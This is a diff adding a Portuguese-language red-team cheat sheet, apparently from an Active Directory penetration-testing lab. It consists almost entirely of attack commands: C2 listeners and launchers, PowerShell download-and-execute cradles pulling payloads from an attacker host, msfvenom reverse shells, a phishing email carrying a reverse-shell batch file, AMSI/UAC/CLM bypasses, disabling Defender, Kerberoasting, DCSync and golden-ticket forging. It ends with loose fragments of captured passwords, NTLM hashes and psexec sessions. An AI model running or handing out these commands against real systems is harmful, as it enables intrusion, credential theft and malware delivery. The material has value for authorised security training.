@@ -1,0 +1,410 @@
+## Reconhecimento 
+    dig google.com +short 
+    whois google.com
+    dnscan.py -d google.com -w subdomains-100.txt #https://github.com/rbsec/dnscan
+    amasss enum -active -d google.com -v -o google.com
+## Cenário de Phishing 
+    #Spoofcheck - Verificas se o dominío pode ser spoofado para phishing
+    python spoofcheck.py mail.google.com
+    # Password Spraying 
+    ./atomizer.py owa target.exemplo.com <SenhaDificil> /tmp/user.txt 
+
+## Empire - Está dando erro se excutado fora da pasta, devem haver trechos do script com Path relativo 
+    sudo ./install.sh #na pasta setup 
+    sudo ./empire
+    # 1 - Criar o Listener
+        listeners
+        uselistener http
+        set BindIP 175.12.80.10
+        set Host http://175.12.80.10:81
+        set Port 81
+    # 2 - Criar o Launcher
+        launcher powershell
+    # 2 - ou por stagger
+        back 
+        usestagger windows/launcher_bat
+        set Listener http
+    # Observação: Com CLM habilitado na Máquina, para usar o empire foi necessário 
+        # 1 - pegar o comando encodado e desencodar
+        # 2 - Hospedar em formato ps1 
+        iex (New-Object Net.WebClient).DownloadString('http://175.12.80.10:8081/rev.ps1') 
+    # 3 - Agentes
+        agents 
+        interact <AGENT> 
+ 
+
+## Covenant - C2 - https://www.sevenlayers.com/index.php/370-covenant-c2-deep-dive
+    git clone --recurse-submodules https://github.com/cobbr/Covenant
+    cd Covenant/Covenant 
+    sudo docker build -t covenant .
+    sudo docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v `pwd`/Data:/app/Data covenant 
+    #Remover o docker para voltar a utilizar
+    sudo docker ps -a
+    sudo docker rm covenant
+    http://127.0.0.1:7443/
+    # 1 - Criar um Listener 
+    # 2 - Criar um Launcher - para cada listener
+        Escolher e clicar em Host para hospedar o launcher 
+    # 3 - Ver vítimas em Grunts 
+        SharpUp audit
+        BypassUACCommand /command:"cmd.exe" /parameters:"/c powershell -Sta -Nop -Window Hidden -Command \"iex (New-Object Net.WebClient).DownloadString('http://175.12.80.10/lab2.ps1')\"" /directory:"" /processid:"0"
+        BypassUACCommand /command:"powershell.exe" /parameters:"-Sta -Nop -Window Hidden -Command \"rundll32 ps.dll,main iex (New-Object Net.WebClient).DownloadString('http://175.12.80.10/lab2.ps1')\"" /directory:"" /processid:"2008"
+
+        SharpShell /code:"var startInfo = new System.Diagnostics.ProcessStartInfo { FileName = @\"C:\Windows\System32\Taskmgr.exe\", WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden }; var cmd1 = new System.Diagnostics.Process { StartInfo = startInfo }; cmd1.Start(); return cmd1.Id.ToString();"
+    
+        # Bypass UAC com psexec 
+            PSExec.exe -i -s cmd 
+    #Personificar Usuário
+        MakeToken /username:"analyst1" /domain:"ELS-CHILD" /password:"a1@3L$-CHILDL0c@l" /logontype:"LOGON32_LOGON_NEW_CREDENTIALS"
+
+    #Importar powershell 
+        Task - PowershellImport 
+        # PowerView após importado pelo PowerShellImport 
+            powershell get-domain #Depois de importar Powerview por exemplo
+            powershell find-localadminaccess 
+            powershell get-netsession #Dessa forma verificará de maneira local as sessões ativas
+            powershell get-netsession -ComputerName NOME_COMPUTADOR
+            Powershell get-domaincontroller | get-netssession # Verifica sessões em todos os DC 
+            powershell get-netloggedon # Usuários ativos logados no localhost 
+            powershell get-netloggedon -ComputerName NOME_COMPUTADOR
+            # Encontrar compartilhamentos acessíveis 
+                powershell invoke-sharefinder
+                powershell invoke-sharefinder -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose
+            
+            powershell get-NetGPOGroup -Verbose
+            powershell Get-NetOU # Lista todos os Organizational Units 
+            powershell Get-NetGPO 
+            powershell get-netuser # Lista usuários 
+            powershell get-netuser | select samaccountname 
+            powershell get-netcomputer # lista computadores 
+            powershell get-netcomputer | select samaccountname,distinguishedname
+            #enumerar grupos
+                powershell get-netgroup -groupname "Domain Admins" -FullData 
+                powershell get-netgroupmember -GroupName "Domain Admins" -FullData
+                
+
+        # Rubeus 
+            Rubeus /command:"triage"
+            Rubeus /command:"klist"
+
+
+        # Unconstrained Delegation 
+            powershell Get-DomainComputer -Unconstrained | select name #Computadores que aceitam delegação 
+            powershell Get-DomainUser -AllowDelegation -AdminCount | select name # Usuário não protegido contra delegação 
+            #Fazer upload do Rubeus e do SpoolSample.exe 
+                # 1 - Colocar o Rubeus para monitorar e salvar o log em arquivo 
+                    powershell .\rub.exe monitor /interval:5 >> r.log
+                    powershell get-process -name rubeus # para anotar o numero do proceso
+                # 2 - rodar o SpoolSample
+                    powershell .\spo.exe child-dc01 win10-web
+                # 3 - Matar o processo do Rubeus para recuperar o arquivo 
+                    powershell type r.log
+                    powershell taskkill /f /pid 3204
+                    Download /filename:"r.log"
+                # 4 - Kali - tratar o ticket [BASE64]
+                    cat /tmp/ticket.txt| tr -d "\n" | tr -d " " 
+                # 5 - No rubeus adicionar o ticket 
+                    Rubeus /command:"ptt /ticket:BASE64"
+                    klist # CMD lista o ticket ativo
+                    Rubeus /command:"klist"
+        # Metasploit 
+            msfvenom --platform Windows -p windows/meterpreter/reverse_tcp lhost=175.12.80.10 lport=4444 -f raw -o test.bin
+            xxd -ps test.bin | tr -d "\n"
+
+            python3 ./MsfMania.py -it local -a x64 -j -s 2 -p windows/meterpreter/reverse_tcp_rc4 -lh 175.12.80.10 -lp 4443 -o mania1
+            for i in `seq 1 20`; do python3 ./MsfMania.py -it local -a x64 -j -s 60 -p windows/x64/meterpreter/reverse_tcp -lh 175.12.80.10 -lp 443 -o ab_$i; done
+            #Covenant shell code 
+
+
+## Versao do .NET
+    powershell Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name version -EA 0 | Where { $_.PSChildName -Match '^(?!S)\p{L}'} | Select PSChildName, version
+
+
+## BloodHound
+    sudo neo4j console
+    ,\BloodHound
+    ## SharpHound
+        iex (New-Object Net.WebClient).DownloadString('http://175.12.80.10:8081/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All
+        ./SharpHound.exe --CollectionMethod All
+        --CollectionMethod All --Throttle 1500 --Jitter 10 --CompressData --RemoveCSV and --NoSaveCache
+        Invoke-BloodHound -CollectionMethod All
+        Invoke-BloodHound -CollectionMethod Acl,ObjectProps
+        Invoke-BloodHound -Throttle 1500 -Jitter 10 #Throttle é a pausa entre requisições e jitter é a variação em porcentagem 
+        Invoke-BloodHound -CompressData -RemoveCSV and -NoSaveCache
+        Invoke-BloodHound -CollectionMethod All -Throttle 1500 -Jitter 10 -CompressData -RemoveCSV and -NoSaveCache
+
+    ## Executar SharpHound via rede - Não depende do Windows, mas também não retorna tudo 
+        pip3 install bloodhound
+        bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all
+
+## ACL - Covnant + Powerview + Runas 
+    PowershellImport PowerView.ps1
+    powershell Invoke-AclScanner | select ObjectDN,ActiveDirectoryRights,IdentityReference
+    powershell Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName match "Analyst1"} #Verifica atributos que são controlados por analyst1 
+
+    ## Generic All 
+        # 1 - Mudar a senha do alvo
+        net user usuario Admin@123 /domain
+        ShellRunAs /shellcommand:"whoami" /username:"usuario" /domain:"ELS-CHILD" /password:"Admin@123"
+        # 2 - Criar um SPN para realizar kerberoasting e quebrar senha offline
+        powershell setspn.exe -a HTPP/jumpbox els-child\usuario_alvo
+        rubeus kerberoast /format:hashcat
+        hashcat -m 13100 krb.txt wordlist.txt 
+
+        # 3 - Habilitar o PreAuthNotRequired para realizar ASREPROASTING 
+        powershell Set-DomainObject -Identity analystm2 -XOR @{useraccountcontrol=4194304} -Verbose 
+        powershell Get-DomainUser -PreauthNotRequired -Verbose -Identity analystm2
+        rubeus asreproast /format:hashcat 
+        hashcat -m 18200 asrep.txt wordlist.txt
+
+    # Verificar ACL que privilegiem um usuário sobre o outro - Propriedades de service_user2 que analyst1 tem acesso 
+        powershell Get-ObjectAcl -SamAccountName service_user2 -ResolveGUIDs | ? {$_.IdentityReference -eq "ELS-CHILD\analyst1"}
+
+    # Pen300 - Encontrar Objetos que seu usuario esteja em uma DACL
+    Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add- Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+	Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add- Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+        # GenericAll 
+        Usuário - Mude a senha 
+        Grupo - Se inclua nele 
+
+## ASREPROAST 
+    powershell Get-DomainUser -PreauthNotRequired -Verbose #Verifica usuários com pré-autenticação de kerberos nao requerida
+    ## ASREPRoasting e Kerberoasting com Covenant 
+        # 1 - Fazer um usuário ter um SPN - Kerberoasting 
+            setspn -U -S http/win10-web service_user
+        # 2 - AsrepRoasting - Propriedade “Do not require Kerberos preauthentication” 
+
+        ## Rubeus para obter os hashes
+            Rubeus kerberoast /format:hashcat
+            Rubeus asreproast /format:hashcat
+            cat /tmp/ticket.txt| tr -d "\n" | tr -d " " 
+            hashcat -m 18200 asrep.txt wordlist.txt
+            hashcat -m 13100 krb.txt wordlist.txt
+
+
+
+## Network Scan 
+    sudo nmap -n -sn 10.100.10.0/24 -oX - | uphosts -oX
+
+## Password Spraying em RDP 
+    python3 RDPassSpray.py -u victim -p Summer2020! -d ELS-CHILD -t 10.100.10.240:65520
+
+## RDP 
+    rdesktop 10.100.10.240:65520 -g 100% -u victim -p 'Summer2020!' -d ELS-CHILD 
+    xfreerdp /u:analyst1 /d:els.bank /p:'P@ssw0rd123' /v:172.16.80.100
+
+## Bypass CLM - Constrained Language Mode 
+	$ExecutionContext.SessionState.LanguageMode
+	setx __PSLockdownPolicy "8" /M
+	
+	# Ferramenta para Bypass de CLM - PowerShdll 
+        curl http://175.12.80.10:8081/PowerShdll/dll/bin/x64/Release/PowerShdll.dll -OutFile ps.dll
+        iex (New-Object Net.WebClient).DownloadString('http://175.12.80.10:8081/PowerShdll/dll/bin/x64/Release/PowerShdll.dll')
+		#Nao aceitou o .\ antes da dll 
+		rundll32 PowerSHdll.dll,main -i 
+		#Com a opção -w ele abre uma nova janela e rodou melhor 
+
+## Bypass AMSI 
+    curl http://175.12.80.10:8081/AmsiScanBufferBypass/amsiby.dll -OutFile a.dll
+    [System.Reflection.Assembly]::LoadFile("C:\Users\victim.ELS-CHILD\a.dll")
+    [AmsiBypass]::Execute() # caso o nome da classe e da funcao nao seja mudado 
+
+## Defender https://windowsdot.com/disable-windows-defender-in-windows-10-5-simple-ways/
+    #CMD 
+    sc stop WinDefend
+    sc query WinDefend
+    sc config WinDefend start= disabled
+    #Powershell 
+    Set-MpPreference -DisableRealtimeMonitoring $true
+
+## Mudar senha de usuário 
+    net user AdminELS /domain
+
+    #Verificar ACL se o usuário tem algum privilégio sobre o AdminELS 
+    >Get-ObjectAcl -ResolveGUIDs -SAMAccountName AdminELS
+    Get-ObjectAcl -SamAccountName AdminELS -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
+
+    #Mudar a senha 
+    >iex (New-Object Net.WebClient).DownloadString('http://175.12.80.10:8081/PowerSploit/Recon/PowerView.ps1')
+    >$UserPassword=ConvertTo-SecureString 'P@ssword1234' -AsPlainText -Force
+    >net user Fulano Senh@123 /domain 
+
+    #Abriondo um Prompt como administrdoe ja que o victim era do grupo adminsitradores LOCAIS
+    >net user AdminELS Password@123
+
+# CrackMapExec - Para executar comandos encodados 
+    # 1 - Encodar um comando em base64 
+    $string = "iex (New-Object Net.WebClient).DownloadString('http://175.12.80.10:8081/PowerSploit/Recon/PowerView.ps1')"
+    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
+    echo $encodedCommand
+
+    # 2 - PowerShell 
+    powershell -Sta -Nop -Window Hidden -EncodedCommand <Comando Encodado> 
+
+    # 3 - CME tem limitação de número e tipo de caractéres 
+    cme smb 10.10.10.10 -u user -p senha -X "powershell -Sta -Nop -Window Hidden -EncodedCommand <Comando Encodado>"
+
+# GPO Abuse 
+    powershell Get-NetGPO | select displayname 
+    powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} 
+
+    #Escola => SharpGPOAbuse para automatizar o processo de abusar de GPO  
+        # 1 - Será necessário compliar uma DLL 
+        # 2 - Intalar o Nuget no Visual Studio 
+            Install-Package ilmerge -Version 3.0.29
+        # 3 - Dar um merge na Dll e no Exe
+            ILMerge.exe /out:SharpGPOAbuseMerged.exe .\SharpGPOAbuse.exe .\CommandLine.dll
+        
+    # Metasploit - https://github.com/b4rtik/metasploit-execute-assembly
+        # 1 - Compilar a Dll como x64 -  HostingCLRx64.dll
+        # 2 - copiar o módulo e a Dll para o metasploit 
+            mkdir -p $home/.msf4/modules/post/windows/manage
+            mv execute-assembly.rb $home/.msf4/modules/post/windows/manage/execute_assembly.rb
+            cp hostingclrx64.dll /usr/share/metasploit- framework/data/post/hostingclrx64.dll
+        # 3 - É módulo de pós exploração, logo ele espera uma sessão 
+            msf5 post(windows/manage/execute_assembly) > set session 1
+            msf5 post(windows/manage/execute_assembly) > set assembly Launcher.exe #Launcher para novo Grunt do Covenant por exemplo 
+            msf5 post(windows/manage/execute_assembly) > set arguments "-h"
+            msf5 post(windows/manage/execute_assembly) > set assemblypath /root/
+            msf5 post(windows/manage/execute_assembly) > run
+
+    # Modificar o https://github.com/ZeroPointSecurity/SharpGPOAbuse para subir com o task de assembly para executar o .NET em memória 
+
+# WMI GRUNT
+    #Existe mais um tipo de GRUNT em WMI que pode ser criado a partir de uma task WMIGrunt 
+        ComputerName:Child-DC01
+        Launcher: Powershell
+        Username:Administrator
+        Password: BLaBlabla
+
+
+# DcSync - Ataque onde se simula o comportamento de um DC para se obter hashes através de replicação de domínio
+    # Conta comprometida deve possuir os atributos Replicating Directory Changes All and Replicating Directory Changes
+    Task DCSync no Covenant
+        Username: ELS-CHILD\krbtgt 
+        FQDN: ELS-CHILD.ELS.LOCAL
+        DC: DC-01.ELS_CHILD.ELS.LOCAL 
+    
+    #Mimikatz
+        .\mimikatz.exe "lsadump::dcsync /user:DOMAIN\krbtgt"
+
+    #Covenant 
+        # 1 - Achar o FQDN 
+            powershell net user /domain 
+        # 2 - DCSync 
+            DcSync DOMAIN\User FQDN 
+            DCSync ELS-CHILD\krbtgt els-child.eLS.local
+
+
+
+# Golden Ticket - criação de Ticket de posse do hash do KRGBTGT 
+        #mimikatz 
+            #Domínio => SID e DOMAIN
+                powershell whoami /user 
+            #Usuário => User e ID 
+            kerberos::golden /sid:S-1-5-21-23589937-599888933-351157107 /domain:els-child.els.local /rc4:e4ba51c7157fe46652603b661f1ccfbe /user:Administrator /id:500 /file:ticket.kirbi
+        #Converter em ticket em base64
+            powershell [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("c:\users\analyst1\ticket.kirbi"))
+        #Incorporar o ticket 
+            Rubeus /ptt /ticket:<BASE_64_TICKET> 
+            Rubeus ptt /ticket:"c:\users\adminels\golden.kirbi"
+            ls \\dc-01\c$
+
+## Portforwarding com NETSH 
+    # 1 - Criar o Listener 
+        netsh interface portproxy add v4tov4 listenport=10000 connectport=80 connectaddress=10.100.10.252
+    # 2 - Abrir a porta no firewall 
+        netsh firewall add portopening TCP 10000 "Open Port 10000"
+
+## Usuário logado
+    query user 
+
+
+## Shell reverso em bat 
+    msfvenom --platform Windows -p cmd/windows/reverse_powershell lhost=172.16.25.10 lport=1234 > att3.bat
+    # Envio pelo sendemail 
+    cat msg.txt| sendemail -t "dev-user@els.corp" -f "atk@els.corp" -u "Click On This" -s "172.16.250.2:25"  -o tls=no -a att3.bat
+
+## Lab 3 - Atalhos 
+    smbexec.py 'Administrator:Doctor@963'@172.16.250.5
+    netsh interface ipv4 set interface Ethernet0 metric=20
+    netsh interface ipv4 set interface Ethernet1 metric=10
+
+    #Winpeas 
+        powershell -Sta -Nop -Window Hidden -Command "curl http://172.16.25.10:8081/PEASS-ng/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe -OutFile wp.exe"
+    # Sharpup 
+        powershell -Sta -Nop -Window Hidden -Command "curl http://172.16.25.10:8081/Ghostpack-CompiledBinaries/SharpUp.exe -OutFile sp.exe"
+    # PowerView 
+        powershell -Sta -Nop -Window Hidden -Command "iex (New-Object Net.WebClient).DownloadString('http://175.12.80.10:8081/PowerSploit/Recon/PowerView.ps1'); Invoke-Sharefinder"
+    #Powerup 
+        powershell -Sta -Nop -Window Hidden -Command "iex (New-Object Net.WebClient).DownloadString('http://175.12.80.10:8081/PowerSploit/Privesc/PowerUp.ps1'); Invoke-AllChecks"
+    # PowerupSQL 
+        iex (New-Object Net.WebClient).DownloadString('http://175.12.80.10:8081/PowerUpSQL/PowerUpSQL.ps1'); Get-SQLInstanceDomain 
+        iex (New-Object Net.WebClient).DownloadString('http://175.12.80.10:8081/PowerUpSQL/PowerUpSQL.ps1'); Get-SQLInstanceScanUDP
+        iex (New-Object Net.WebClient).DownloadString('http://175.12.80.10:8081/PowerUpSQL/PowerUpSQL.ps1'); Get-SQLInstanceLocal
+       
+
+    #Invokekerberoasting
+        powershell -Sta -Nop -Window Hidden -Command "iex (New-Object Net.WebClient).DownloadString('http://172.16.25.10:8081/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -Domain mgmt.corp | %{$.Hash} | Out-File -Encoding ASCII hashes.teste"
+
+    # Mimikatz - logonpasswords
+    migrate $x64_pid
+    load kiwi 
+    kiwi_cmd 'sekurlsa::logonpasswords'    
+powershell -Sta -Nop -Window Hidden -Command "curl http://172.16.40.10:8081/rev.exe -OutFile rev.exe"
+
+
+proxychains crackmapexec smb -u 'dev-admin' -p 'H@rdP@ssD!ff!cult964!!' -d ELS-CHILD 10.10.2.0/24
+proxychains ldapdomaindump -u 'ELS-CHILD\dev-admin' -p 'H@rdP@ssD!ff!cult964!!' --authtype SIMPLE ldap://10.10.2.2:389
+proxychains ldapdomaindump -u 'ELS.CORP\els-admin' -p 'aad3b435b51404eeaad3b435b51404ee:8645e87e2593507cf623f3291b1334c2' --authtype NTLM ldap://10.10.3.2:389 
+
+
+server = poplib.POP3('172.16.250.2','110')
+server.user("dev-user")
+server.pass_("D3v3l0pm3nt!@#$%") D3v3l0pm3ntUs3r@964
+
+UserName      : administrator
+DefaultPassword      : Doctor@963
+
+
+         * Username : dev-admin
+         * Domain   : ELS-CHILD
+         * Password : H@rdP@ssD!ff!cult964!!
+
+
+
+msf6 exploit(windows/smb/psexec) > set smbpass Doctor@963
+smbpass => Doctor@963
+msf6 exploit(windows/smb/psexec) > set username administrator
+username => administrator
+msf6 exploit(windows/smb/psexec) > set rhosts 172.16.250.5
+rhosts => 172.16.250.5
+msf6 exploit(windows/smb/psexec) > run
+
+
+
+msf6 exploit(windows/smb/psexec) > set smbdomain els.corp
+smbdomain => els.corp
+msf6 exploit(windows/smb/psexec) > set smbuser els-admin
+smbuser => els-admin
+msf6 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:8645e87e2593507cf623f3291b1334c2
+smbpass => aad3b435b51404eeaad3b435b51404ee:8645e87e2593507cf623f3291b1334c2
+msf6 exploit(windows/smb/psexec) > set rhosts 10.10.1.3
+rhosts => 10.10.1.3
+msf6 exploit(windows/smb/psexec) > set payload windows/meterpreter/bind_tcp
+payload => windows/meterpreter/bind_tcp
+msf6 exploit(windows/smb/psexec) > set lport 651234
+lport => 651234
+msf6 exploit(windows/smb/psexec) > run 
+
+
+
+msf6 exploit(windows/smb/psexec) > set smbdomain MGMT.CORP
+smbdomain => MGMT.CORP
+msf6 exploit(windows/smb/psexec) > set smbuser spn_svc
+smbuser => spn_svc
+msf6 exploit(windows/smb/psexec) > set smbpass
+set smbpass  
+msf6 exploit(windows/smb/psexec) > set smbpass B@DB!tch
+smbpass => B@DB!tch
+msf6 exploit(windows/smb/psexec) > set rhost 10.10.3.2
